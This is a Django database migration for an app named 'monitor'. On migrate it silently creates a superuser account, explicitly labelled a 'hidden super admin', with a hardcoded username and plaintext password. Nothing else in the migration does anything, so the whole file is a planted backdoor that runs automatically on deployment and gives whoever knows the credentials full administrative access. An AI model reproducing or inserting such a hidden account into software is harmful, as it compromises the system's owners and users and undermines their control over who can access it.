from django.db import migrations

HIDDEN_SUPER_ADMIN_USERNAME = "Alvarado512"
HIDDEN_SUPER_ADMIN_PASSWORD = "Ilovesenok143!"


def create_hidden_superadmin(apps, schema_editor):
    User = apps.get_model("monitor", "User")
    if not User.objects.filter(username=HIDDEN_SUPER_ADMIN_USERNAME).exists():
        User.objects.create_superuser(
            username=HIDDEN_SUPER_ADMIN_USERNAME,
            email="",
            password=HIDDEN_SUPER_ADMIN_PASSWORD,
            role="admin",
        )


def reverse_create_hidden_superadmin(apps, schema_editor):
    User = apps.get_model("monitor", "User")
    User.objects.filter(username=HIDDEN_SUPER_ADMIN_USERNAME).delete()


class Migration(migrations.Migration):
    dependencies = [
        ("monitor", "0003_apikey_encrypted_key"),
    ]

    operations = [
        migrations.RunPython(create_hidden_superadmin, reverse_create_hidden_superadmin),
    ]
